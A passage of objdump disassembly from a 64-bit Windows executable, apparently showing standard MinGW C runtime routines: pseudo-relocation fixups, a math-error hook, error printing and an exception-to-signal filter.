  409e3d:	83 38 02             	cmpl   $0x2,(%rax)
  409e40:	74 06                	je     0x409e48
  409e42:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  409e48:	83 fa 02             	cmp    $0x2,%edx
  409e4b:	74 13                	je     0x409e60
  409e4d:	83 fa 01             	cmp    $0x1,%edx
  409e50:	74 40                	je     0x409e92
  409e52:	b8 01 00 00 00       	mov    $0x1,%eax
  409e57:	48 83 c4 28          	add    $0x28,%rsp
  409e5b:	5b                   	pop    %rbx
  409e5c:	5e                   	pop    %rsi
  409e5d:	c3                   	ret
  409e5e:	66 90                	xchg   %ax,%ax
  409e60:	48 8d 1d f9 21 03 00 	lea    0x321f9(%rip),%rbx        # 0x43c060
  409e67:	48 8d 35 f2 21 03 00 	lea    0x321f2(%rip),%rsi        # 0x43c060
  409e6e:	48 39 de             	cmp    %rbx,%rsi
  409e71:	74 df                	je     0x409e52
  409e73:	48 8b 03             	mov    (%rbx),%rax
  409e76:	48 85 c0             	test   %rax,%rax
  409e79:	74 02                	je     0x409e7d
  409e7b:	ff d0                	call   *%rax
  409e7d:	48 83 c3 08          	add    $0x8,%rbx
  409e81:	48 39 de             	cmp    %rbx,%rsi
  409e84:	75 ed                	jne    0x409e73
  409e86:	b8 01 00 00 00       	mov    $0x1,%eax
  409e8b:	48 83 c4 28          	add    $0x28,%rsp
  409e8f:	5b                   	pop    %rbx
  409e90:	5e                   	pop    %rsi
  409e91:	c3                   	ret
  409e92:	e8 69 0c 00 00       	call   0x40ab00
  409e97:	eb b9                	jmp    0x409e52
  409e99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409ea0:	31 c0                	xor    %eax,%eax
  409ea2:	c3                   	ret
  409ea3:	90                   	nop
  409ea4:	90                   	nop
  409ea5:	90                   	nop
  409ea6:	90                   	nop
  409ea7:	90                   	nop
  409ea8:	90                   	nop
  409ea9:	90                   	nop
  409eaa:	90                   	nop
  409eab:	90                   	nop
  409eac:	90                   	nop
  409ead:	90                   	nop
  409eae:	90                   	nop
  409eaf:	90                   	nop
  409eb0:	48 83 ec 58          	sub    $0x58,%rsp
  409eb4:	48 8b 05 05 b2 02 00 	mov    0x2b205(%rip),%rax        # 0x4350c0
  409ebb:	48 85 c0             	test   %rax,%rax
  409ebe:	74 2c                	je     0x409eec
  409ec0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  409ec7:	00 00 
  409ec9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  409ecd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  409ed2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  409ed7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  409edd:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  409ee3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  409ee9:	ff d0                	call   *%rax
  409eeb:	90                   	nop
  409eec:	48 83 c4 58          	add    $0x58,%rsp
  409ef0:	c3                   	ret
  409ef1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  409ef8:	0f 1f 84 00 00 00 00 
  409eff:	00 
  409f00:	48 89 0d b9 b1 02 00 	mov    %rcx,0x2b1b9(%rip)        # 0x4350c0
  409f07:	e9 8c 17 00 00       	jmp    0x40b698
  409f0c:	0f 1f 40 00          	nopl   0x0(%rax)
  409f10:	56                   	push   %rsi
  409f11:	53                   	push   %rbx
  409f12:	48 83 ec 78          	sub    $0x78,%rsp
  409f16:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  409f1b:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  409f20:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  409f26:	83 39 06             	cmpl   $0x6,(%rcx)
  409f29:	0f 87 c1 00 00 00    	ja     0x409ff0
  409f2f:	8b 01                	mov    (%rcx),%eax
  409f31:	48 8d 15 8c ce 00 00 	lea    0xce8c(%rip),%rdx        # 0x416dc4
  409f38:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  409f3c:	48 01 d0             	add    %rdx,%rax
  409f3f:	ff e0                	jmp    *%rax
  409f41:	48 8d 1d 58 cd 00 00 	lea    0xcd58(%rip),%rbx        # 0x416ca0
  409f48:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  409f4c:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  409f52:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  409f57:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  409f5c:	e8 4f 17 00 00       	call   0x40b6b0
  409f61:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  409f68:	49 89 f1             	mov    %rsi,%r9
  409f6b:	49 89 d8             	mov    %rbx,%r8
  409f6e:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  409f74:	48 8d 48 60          	lea    0x60(%rax),%rcx
  409f78:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  409f7e:	48 8d 15 13 ce 00 00 	lea    0xce13(%rip),%rdx        # 0x416d98
  409f85:	e8 4e 16 00 00       	call   0x40b5d8
  409f8a:	90                   	nop
  409f8b:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  409f90:	31 c0                	xor    %eax,%eax
  409f92:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  409f97:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  409f9d:	48 83 c4 78          	add    $0x78,%rsp
  409fa1:	5b                   	pop    %rbx
  409fa2:	5e                   	pop    %rsi
  409fa3:	c3                   	ret
  409fa4:	48 8d 1d 14 cd 00 00 	lea    0xcd14(%rip),%rbx        # 0x416cbf
  409fab:	eb 9b                	jmp    0x409f48
  409fad:	0f 1f 00             	nopl   (%rax)
  409fb0:	48 8d 1d 29 cd 00 00 	lea    0xcd29(%rip),%rbx        # 0x416ce0
  409fb7:	eb 8f                	jmp    0x409f48
  409fb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409fc0:	48 8d 1d 89 cd 00 00 	lea    0xcd89(%rip),%rbx        # 0x416d50
  409fc7:	e9 7c ff ff ff       	jmp    0x409f48
  409fcc:	0f 1f 40 00          	nopl   0x0(%rax)
  409fd0:	48 8d 1d 51 cd 00 00 	lea    0xcd51(%rip),%rbx        # 0x416d28
  409fd7:	e9 6c ff ff ff       	jmp    0x409f48
  409fdc:	0f 1f 40 00          	nopl   0x0(%rax)
  409fe0:	48 8d 1d 19 cd 00 00 	lea    0xcd19(%rip),%rbx        # 0x416d00
  409fe7:	e9 5c ff ff ff       	jmp    0x409f48
  409fec:	0f 1f 40 00          	nopl   0x0(%rax)
  409ff0:	48 8d 1d 8f cd 00 00 	lea    0xcd8f(%rip),%rbx        # 0x416d86
  409ff7:	e9 4c ff ff ff       	jmp    0x409f48
  409ffc:	90                   	nop
  409ffd:	90                   	nop
  409ffe:	90                   	nop
  409fff:	90                   	nop
  40a000:	db e3                	fninit
  40a002:	c3                   	ret
  40a003:	90                   	nop
  40a004:	90                   	nop
  40a005:	90                   	nop
  40a006:	90                   	nop
  40a007:	90                   	nop
  40a008:	90                   	nop
  40a009:	90                   	nop
  40a00a:	90                   	nop
  40a00b:	90                   	nop
  40a00c:	90                   	nop
  40a00d:	90                   	nop
  40a00e:	90                   	nop
  40a00f:	90                   	nop
  40a010:	48 89 c8             	mov    %rcx,%rax
  40a013:	c3                   	ret
  40a014:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  40a01b:	00 00 00 00 00 
  40a020:	48 89 c8             	mov    %rcx,%rax
  40a023:	c3                   	ret
  40a024:	90                   	nop
  40a025:	90                   	nop
  40a026:	90                   	nop
  40a027:	90                   	nop
  40a028:	90                   	nop
  40a029:	90                   	nop
  40a02a:	90                   	nop
  40a02b:	90                   	nop
  40a02c:	90                   	nop
  40a02d:	90                   	nop
  40a02e:	90                   	nop
  40a02f:	90                   	nop
  40a030:	56                   	push   %rsi
  40a031:	53                   	push   %rbx
  40a032:	48 83 ec 38          	sub    $0x38,%rsp
  40a036:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40a03b:	48 89 cb             	mov    %rcx,%rbx
  40a03e:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  40a043:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40a048:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  40a04d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40a052:	e8 59 16 00 00       	call   0x40b6b0
  40a057:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  40a05d:	ba 01 00 00 00       	mov    $0x1,%edx
  40a062:	4c 8d 48 60          	lea    0x60(%rax),%r9
  40a066:	48 8d 0d 73 cd 00 00 	lea    0xcd73(%rip),%rcx        # 0x416de0
  40a06d:	e8 46 15 00 00       	call   0x40b5b8
  40a072:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40a077:	e8 34 16 00 00       	call   0x40b6b0
  40a07c:	48 89 da             	mov    %rbx,%rdx
  40a07f:	48 8d 48 60          	lea    0x60(%rax),%rcx
  40a083:	49 89 f0             	mov    %rsi,%r8
  40a086:	e8 dd 14 00 00       	call   0x40b568
  40a08b:	e8 90 15 00 00       	call   0x40b620
  40a090:	90                   	nop
  40a091:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40a098:	0f 1f 84 00 00 00 00 
  40a09f:	00 
  40a0a0:	41 55                	push   %r13
  40a0a2:	41 54                	push   %r12
  40a0a4:	55                   	push   %rbp
  40a0a5:	57                   	push   %rdi
  40a0a6:	56                   	push   %rsi
  40a0a7:	53                   	push   %rbx
  40a0a8:	48 83 ec 58          	sub    $0x58,%rsp
  40a0ac:	48 89 ce             	mov    %rcx,%rsi
  40a0af:	8b 0d 2f b0 02 00    	mov    0x2b02f(%rip),%ecx        # 0x4350e4
  40a0b5:	48 89 d7             	mov    %rdx,%rdi
  40a0b8:	4c 89 c5             	mov    %r8,%rbp
  40a0bb:	85 c9                	test   %ecx,%ecx
  40a0bd:	0f 8e f5 00 00 00    	jle    0x40a1b8
  40a0c3:	48 8b 05 1e b0 02 00 	mov    0x2b01e(%rip),%rax        # 0x4350e8
  40a0ca:	31 db                	xor    %ebx,%ebx
  40a0cc:	48 83 c0 08          	add    $0x8,%rax
  40a0d0:	48 8b 10             	mov    (%rax),%rdx
  40a0d3:	48 39 d6             	cmp    %rdx,%rsi
  40a0d6:	72 14                	jb     0x40a0ec
  40a0d8:	4c 8b 40 08          	mov    0x8(%rax),%r8
  40a0dc:	45 8b 40 08          	mov    0x8(%r8),%r8d
  40a0e0:	4c 01 c2             	add    %r8,%rdx
  40a0e3:	48 39 d6             	cmp    %rdx,%rsi
  40a0e6:	0f 82 b2 00 00 00    	jb     0x40a19e
  40a0ec:	83 c3 01             	add    $0x1,%ebx
  40a0ef:	48 83 c0 18          	add    $0x18,%rax
  40a0f3:	39 cb                	cmp    %ecx,%ebx
  40a0f5:	75 d9                	jne    0x40a0d0
  40a0f7:	48 89 f1             	mov    %rsi,%rcx
  40a0fa:	e8 01 0c 00 00       	call   0x40ad00
  40a0ff:	48 85 c0             	test   %rax,%rax
  40a102:	49 89 c4             	mov    %rax,%r12
  40a105:	0f 84 e5 00 00 00    	je     0x40a1f0
  40a10b:	48 63 db             	movslq %ebx,%rbx
  40a10e:	48 8d 1c 5b          	lea    (%rbx,%rbx,2),%rbx
  40a112:	48 c1 e3 03          	shl    $0x3,%rbx
  40a116:	49 89 dd             	mov    %rbx,%r13
  40a119:	4c 03 2d c8 af 02 00 	add    0x2afc8(%rip),%r13        # 0x4350e8
  40a120:	49 89 45 10          	mov    %rax,0x10(%r13)
  40a124:	41 c7 45 00 00 00 00 	movl   $0x0,0x0(%r13)
  40a12b:	00 
  40a12c:	e8 1f 0d 00 00       	call   0x40ae50
  40a131:	41 8b 54 24 0c       	mov    0xc(%r12),%edx
  40a136:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  40a13c:	48 01 d0             	add    %rdx,%rax
  40a13f:	49 89 45 08          	mov    %rax,0x8(%r13)
  40a143:	48 8b 05 9e af 02 00 	mov    0x2af9e(%rip),%rax        # 0x4350e8
  40a14a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  40a14f:	48 8b 4c 18 08       	mov    0x8(%rax,%rbx,1),%rcx
  40a154:	ff 15 aa 12 03 00    	call   *0x312aa(%rip)        # 0x43b404
  40a15a:	48 85 c0             	test   %rax,%rax
  40a15d:	74 74                	je     0x40a1d3
  40a15f:	8b 44 24 44          	mov    0x44(%rsp),%eax
  40a163:	8d 50 c0             	lea    -0x40(%rax),%edx
  40a166:	83 e2 bf             	and    $0xffffffbf,%edx
  40a169:	74 2c                	je     0x40a197
  40a16b:	83 e8 04             	sub    $0x4,%eax
  40a16e:	83 e0 fb             	and    $0xfffffffb,%eax
  40a171:	74 24                	je     0x40a197
  40a173:	48 03 1d 6e af 02 00 	add    0x2af6e(%rip),%rbx        # 0x4350e8
  40a17a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  40a180:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  40a185:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  40a18a:	49 89 d9             	mov    %rbx,%r9
  40a18d:	ff 15 69 12 03 00    	call   *0x31269(%rip)        # 0x43b3fc
  40a193:	85 c0                	test   %eax,%eax
  40a195:	74 28                	je     0x40a1bf
  40a197:	83 05 46 af 02 00 01 	addl   $0x1,0x2af46(%rip)        # 0x4350e4
  40a19e:	49 89 e8             	mov    %rbp,%r8
  40a1a1:	48 89 fa             	mov    %rdi,%rdx
  40a1a4:	48 89 f1             	mov    %rsi,%rcx
  40a1a7:	48 83 c4 58          	add    $0x58,%rsp
  40a1ab:	5b                   	pop    %rbx
  40a1ac:	5e                   	pop    %rsi
  40a1ad:	5f                   	pop    %rdi
  40a1ae:	5d                   	pop    %rbp
  40a1af:	41 5c                	pop    %r12
  40a1b1:	41 5d                	pop    %r13
  40a1b3:	e9 e8 13 00 00       	jmp    0x40b5a0
  40a1b8:	31 db                	xor    %ebx,%ebx
  40a1ba:	e9 38 ff ff ff       	jmp    0x40a0f7
  40a1bf:	ff 15 6f 11 03 00    	call   *0x3116f(%rip)        # 0x43b334
  40a1c5:	48 8d 0d 8c cc 00 00 	lea    0xcc8c(%rip),%rcx        # 0x416e58
  40a1cc:	89 c2                	mov    %eax,%edx
  40a1ce:	e8 5d fe ff ff       	call   0x40a030
  40a1d3:	48 8b 05 0e af 02 00 	mov    0x2af0e(%rip),%rax        # 0x4350e8
  40a1da:	48 8d 0d 3f cc 00 00 	lea    0xcc3f(%rip),%rcx        # 0x416e20
  40a1e1:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  40a1e6:	4c 8b 44 18 08       	mov    0x8(%rax,%rbx,1),%r8
  40a1eb:	e8 40 fe ff ff       	call   0x40a030
  40a1f0:	48 8d 0d 09 cc 00 00 	lea    0xcc09(%rip),%rcx        # 0x416e00
  40a1f7:	48 89 f2             	mov    %rsi,%rdx
  40a1fa:	e8 31 fe ff ff       	call   0x40a030
  40a1ff:	90                   	nop
  40a200:	55                   	push   %rbp
  40a201:	41 57                	push   %r15
  40a203:	41 56                	push   %r14
  40a205:	41 55                	push   %r13
  40a207:	41 54                	push   %r12
  40a209:	57                   	push   %rdi
  40a20a:	56                   	push   %rsi
  40a20b:	53                   	push   %rbx
  40a20c:	48 83 ec 68          	sub    $0x68,%rsp
  40a210:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  40a217:	00 
  40a218:	8b 35 c2 ae 02 00    	mov    0x2aec2(%rip),%esi        # 0x4350e0
  40a21e:	85 f6                	test   %esi,%esi
  40a220:	74 11                	je     0x40a233
  40a222:	48 8d 65 e8          	lea    -0x18(%rbp),%rsp
  40a226:	5b                   	pop    %rbx
  40a227:	5e                   	pop    %rsi
  40a228:	5f                   	pop    %rdi
  40a229:	41 5c                	pop    %r12
  40a22b:	41 5d                	pop    %r13
  40a22d:	41 5e                	pop    %r14
  40a22f:	41 5f                	pop    %r15
  40a231:	5d                   	pop    %rbp
  40a232:	c3                   	ret
  40a233:	c7 05 a3 ae 02 00 01 	movl   $0x1,0x2aea3(%rip)        # 0x4350e0
  40a23a:	00 00 00 
  40a23d:	e8 4e 0b 00 00       	call   0x40ad90
  40a242:	48 98                	cltq
  40a244:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  40a248:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  40a24f:	00 
  40a250:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  40a254:	e8 a7 0d 00 00       	call   0x40b000
  40a259:	4c 8b 25 b0 d5 00 00 	mov    0xd5b0(%rip),%r12        # 0x417810
  40a260:	c7 05 7a ae 02 00 00 	movl   $0x0,0x2ae7a(%rip)        # 0x4350e4
  40a267:	00 00 00 
  40a26a:	48 8b 1d af d5 00 00 	mov    0xd5af(%rip),%rbx        # 0x417820
  40a271:	48 29 c4             	sub    %rax,%rsp
  40a274:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  40a279:	48 89 05 68 ae 02 00 	mov    %rax,0x2ae68(%rip)        # 0x4350e8
  40a280:	4c 89 e0             	mov    %r12,%rax
  40a283:	48 29 d8             	sub    %rbx,%rax
  40a286:	48 83 f8 07          	cmp    $0x7,%rax
  40a28a:	7e 96                	jle    0x40a222
  40a28c:	48 83 f8 0b          	cmp    $0xb,%rax
  40a290:	7e 2e                	jle    0x40a2c0
  40a292:	44 8b 1b             	mov    (%rbx),%r11d
  40a295:	45 85 db             	test   %r11d,%r11d
  40a298:	0f 85 42 01 00 00    	jne    0x40a3e0
  40a29e:	44 8b 53 04          	mov    0x4(%rbx),%r10d
  40a2a2:	45 85 d2             	test   %r10d,%r10d
  40a2a5:	0f 85 35 01 00 00    	jne    0x40a3e0
  40a2ab:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
  40a2af:	45 85 c9             	test   %r9d,%r9d
  40a2b2:	75 23                	jne    0x40a2d7
  40a2b4:	48 83 c3 0c          	add    $0xc,%rbx
  40a2b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a2bf:	00 
  40a2c0:	44 8b 03             	mov    (%rbx),%r8d
  40a2c3:	45 85 c0             	test   %r8d,%r8d
  40a2c6:	0f 85 14 01 00 00    	jne    0x40a3e0
  40a2cc:	8b 4b 04             	mov    0x4(%rbx),%ecx
  40a2cf:	85 c9                	test   %ecx,%ecx
  40a2d1:	0f 85 09 01 00 00    	jne    0x40a3e0
  40a2d7:	8b 53 08             	mov    0x8(%rbx),%edx
  40a2da:	83 fa 01             	cmp    $0x1,%edx
  40a2dd:	0f 85 07 02 00 00    	jne    0x40a4ea
  40a2e3:	48 83 c3 0c          	add    $0xc,%rbx
  40a2e7:	4c 39 e3             	cmp    %r12,%rbx
  40a2ea:	0f 83 32 ff ff ff    	jae    0x40a222
  40a2f0:	4c 8b 2d 49 d5 00 00 	mov    0xd549(%rip),%r13        # 0x417840
  40a2f7:	4c 8d 75 b0          	lea    -0x50(%rbp),%r14
  40a2fb:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
  40a302:	ff ff ff 
  40a305:	8b 4b 04             	mov    0x4(%rbx),%ecx
  40a308:	8b 03                	mov    (%rbx),%eax
  40a30a:	0f b6 53 08          	movzbl 0x8(%rbx),%edx
  40a30e:	4c 01 e9             	add    %r13,%rcx
  40a311:	4c 01 e8             	add    %r13,%rax
  40a314:	83 fa 10             	cmp    $0x10,%edx
  40a317:	4c 8b 00             	mov    (%rax),%r8
  40a31a:	0f 84 36 01 00 00    	je     0x40a456
  40a320:	0f 86 f8 00 00 00    	jbe    0x40a41e
  40a326:	83 fa 20             	cmp    $0x20,%edx
  40a329:	0f 84 6f 01 00 00    	je     0x40a49e
  40a32f:	83 fa 40             	cmp    $0x40,%edx
  40a332:	0f 85 52 01 00 00    	jne    0x40a48a
  40a338:	48 8b 39             	mov    (%rcx),%rdi
  40a33b:	4c 89 f2             	mov    %r14,%rdx
  40a33e:	48 29 c7             	sub    %rax,%rdi
  40a341:	49 01 f8             	add    %rdi,%r8
  40a344:	4c 89 f7             	mov    %r14,%rdi
  40a347:	4c 89 45 b0          	mov    %r8,-0x50(%rbp)
  40a34b:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  40a351:	e8 4a fd ff ff       	call   0x40a0a0
  40a356:	48 83 c3 0c          	add    $0xc,%rbx
  40a35a:	4c 39 e3             	cmp    %r12,%rbx
  40a35d:	72 a6                	jb     0x40a305
  40a35f:	90                   	nop
  40a360:	8b 05 7e ad 02 00    	mov    0x2ad7e(%rip),%eax        # 0x4350e4
  40a366:	31 db                	xor    %ebx,%ebx
  40a368:	85 c0                	test   %eax,%eax
  40a36a:	0f 8e b2 fe ff ff    	jle    0x40a222
  40a370:	4c 8b 25 8d 10 03 00 	mov    0x3108d(%rip),%r12        # 0x43b404
  40a377:	4c 8d 75 ac          	lea    -0x54(%rbp),%r14
  40a37b:	4c 8b 2d 7a 10 03 00 	mov    0x3107a(%rip),%r13        # 0x43b3fc
  40a382:	eb 13                	jmp    0x40a397
  40a384:	83 c6 01             	add    $0x1,%esi
  40a387:	48 83 c3 18          	add    $0x18,%rbx
  40a38b:	3b 35 53 ad 02 00    	cmp    0x2ad53(%rip),%esi        # 0x4350e4
  40a391:	0f 8d 8b fe ff ff    	jge    0x40a222
  40a397:	48 89 d8             	mov    %rbx,%rax
  40a39a:	48 03 05 47 ad 02 00 	add    0x2ad47(%rip),%rax        # 0x4350e8
  40a3a1:	8b 10                	mov    (%rax),%edx
  40a3a3:	85 d2                	test   %edx,%edx
  40a3a5:	74 dd                	je     0x40a384
  40a3a7:	48 8b 48 08          	mov    0x8(%rax),%rcx
  40a3ab:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  40a3b1:	48 89 fa             	mov    %rdi,%rdx
  40a3b4:	41 ff d4             	call   *%r12
  40a3b7:	48 85 c0             	test   %rax,%rax
  40a3ba:	0f 84 0c 01 00 00    	je     0x40a4cc
  40a3c0:	48 8b 05 21 ad 02 00 	mov    0x2ad21(%rip),%rax        # 0x4350e8
  40a3c7:	4d 89 f1             	mov    %r14,%r9
  40a3ca:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  40a3ce:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  40a3d2:	44 8b 04 18          	mov    (%rax,%rbx,1),%r8d
  40a3d6:	41 ff d5             	call   *%r13
  40a3d9:	eb a9                	jmp    0x40a384
  40a3db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40a3e0:	4c 39 e3             	cmp    %r12,%rbx
  40a3e3:	0f 83 39 fe ff ff    	jae    0x40a222
  40a3e9:	4c 8b 2d 50 d4 00 00 	mov    0xd450(%rip),%r13        # 0x417840
  40a3f0:	48 8d 7d b0          	lea    -0x50(%rbp),%rdi
  40a3f4:	8b 4b 04             	mov    0x4(%rbx),%ecx
  40a3f7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40a3fd:	48 89 fa             	mov    %rdi,%rdx
  40a400:	48 83 c3 08          	add    $0x8,%rbx
  40a404:	8b 43 f8             	mov    -0x8(%rbx),%eax
  40a407:	4c 01 e9             	add    %r13,%rcx
  40a40a:	03 01                	add    (%rcx),%eax
  40a40c:	89 45 b0             	mov    %eax,-0x50(%rbp)
  40a40f:	e8 8c fc ff ff       	call   0x40a0a0
  40a414:	4c 39 e3             	cmp    %r12,%rbx
  40a417:	72 db                	jb     0x40a3f4
  40a419:	e9 42 ff ff ff       	jmp    0x40a360
  40a41e:	83 fa 08             	cmp    $0x8,%edx
  40a421:	75 67                	jne    0x40a48a
  40a423:	0f b6 11             	movzbl (%rcx),%edx
  40a426:	4c 89 f7             	mov    %r14,%rdi
  40a429:	49 89 d2             	mov    %rdx,%r10
  40a42c:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  40a433:	84 d2                	test   %dl,%dl
  40a435:	49 0f 48 d2          	cmovs  %r10,%rdx
  40a439:	48 29 c2             	sub    %rax,%rdx
  40a43c:	49 01 d0             	add    %rdx,%r8
  40a43f:	4c 89 f2             	mov    %r14,%rdx
  40a442:	4c 89 45 b0          	mov    %r8,-0x50(%rbp)
  40a446:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40a44c:	e8 4f fc ff ff       	call   0x40a0a0
  40a451:	e9 00 ff ff ff       	jmp    0x40a356
  40a456:	0f b7 11             	movzwl (%rcx),%edx
  40a459:	4c 89 f7             	mov    %r14,%rdi
  40a45c:	49 89 d2             	mov    %rdx,%r10
  40a45f:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  40a466:	66 85 d2             	test   %dx,%dx
  40a469:	49 0f 48 d2          	cmovs  %r10,%rdx
  40a46d:	48 29 c2             	sub    %rax,%rdx
  40a470:	49 01 d0             	add    %rdx,%r8
  40a473:	4c 89 f2             	mov    %r14,%rdx
  40a476:	4c 89 45 b0          	mov    %r8,-0x50(%rbp)
  40a47a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  40a480:	e8 1b fc ff ff       	call   0x40a0a0
  40a485:	e9 cc fe ff ff       	jmp    0x40a356
  40a48a:	48 8d 0d 27 ca 00 00 	lea    0xca27(%rip),%rcx        # 0x416eb8
  40a491:	48 c7 45 b0 00 00 00 	movq   $0x0,-0x50(%rbp)
  40a498:	00 
  40a499:	e8 92 fb ff ff       	call   0x40a030
  40a49e:	8b 11                	mov    (%rcx),%edx
  40a4a0:	4c 89 f7             	mov    %r14,%rdi
  40a4a3:	49 89 d2             	mov    %rdx,%r10
  40a4a6:	4d 09 fa             	or     %r15,%r10
  40a4a9:	85 d2                	test   %edx,%edx
  40a4ab:	49 0f 48 d2          	cmovs  %r10,%rdx
  40a4af:	48 29 c2             	sub    %rax,%rdx
  40a4b2:	49 01 d0             	add    %rdx,%r8
  40a4b5:	4c 89 f2             	mov    %r14,%rdx
  40a4b8:	4c 89 45 b0          	mov    %r8,-0x50(%rbp)
  40a4bc:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40a4c2:	e8 d9 fb ff ff       	call   0x40a0a0
  40a4c7:	e9 8a fe ff ff       	jmp    0x40a356
  40a4cc:	48 03 1d 15 ac 02 00 	add    0x2ac15(%rip),%rbx        # 0x4350e8
  40a4d3:	48 8d 0d 46 c9 00 00 	lea    0xc946(%rip),%rcx        # 0x416e20
  40a4da:	48 8b 43 10          	mov    0x10(%rbx),%rax
  40a4de:	4c 8b 43 08          	mov    0x8(%rbx),%r8
  40a4e2:	8b 50 08             	mov    0x8(%rax),%edx
  40a4e5:	e8 46 fb ff ff       	call   0x40a030
  40a4ea:	48 8d 0d 8f c9 00 00 	lea    0xc98f(%rip),%rcx        # 0x416e80
  40a4f1:	e8 3a fb ff ff       	call   0x40a030
  40a4f6:	90                   	nop
  40a4f7:	90                   	nop
  40a4f8:	90                   	nop
  40a4f9:	90                   	nop
  40a4fa:	90                   	nop
  40a4fb:	90                   	nop
  40a4fc:	90                   	nop
  40a4fd:	90                   	nop
  40a4fe:	90                   	nop
  40a4ff:	90                   	nop
  40a500:	48 83 ec 28          	sub    $0x28,%rsp
  40a504:	8b 01                	mov    (%rcx),%eax
  40a506:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40a50b:	77 63                	ja     0x40a570
  40a50d:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40a512:	73 7b                	jae    0x40a58f
  40a514:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  40a519:	0f 84 0d 01 00 00    	je     0x40a62c
  40a51f:	0f 87 db 00 00 00    	ja     0x40a600
  40a525:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  40a52a:	0f 84 fc 00 00 00    	je     0x40a62c
  40a530:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40a535:	0f 85 d3 00 00 00    	jne    0x40a60e
  40a53b:	31 d2                	xor    %edx,%edx
  40a53d:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a542:	e8 49 10 00 00       	call   0x40b590
  40a547:	48 83 f8 01          	cmp    $0x1,%rax
  40a54b:	0f 84 31 01 00 00    	je     0x40a682
  40a551:	48 85 c0             	test   %rax,%rax
  40a554:	0f 84 08 01 00 00    	je     0x40a662
  40a55a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a55f:	ff d0                	call   *%rax
  40a561:	31 c0                	xor    %eax,%eax
  40a563:	48 83 c4 28          	add    $0x28,%rsp
  40a567:	c3                   	ret
  40a568:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a56f:	00 
  40a570:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  40a575:	0f 84 b8 00 00 00    	je     0x40a633
  40a57b:	77 43                	ja     0x40a5c0
  40a57d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  40a582:	0f 84 a4 00 00 00    	je     0x40a62c
  40a588:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40a58d:	75 7f                	jne    0x40a60e
  40a58f:	31 d2                	xor    %edx,%edx
  40a591:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a596:	e8 f5 0f 00 00       	call   0x40b590
  40a59b:	48 83 f8 01          	cmp    $0x1,%rax
  40a59f:	48 89 c2             	mov    %rax,%rdx
  40a5a2:	74 74                	je     0x40a618
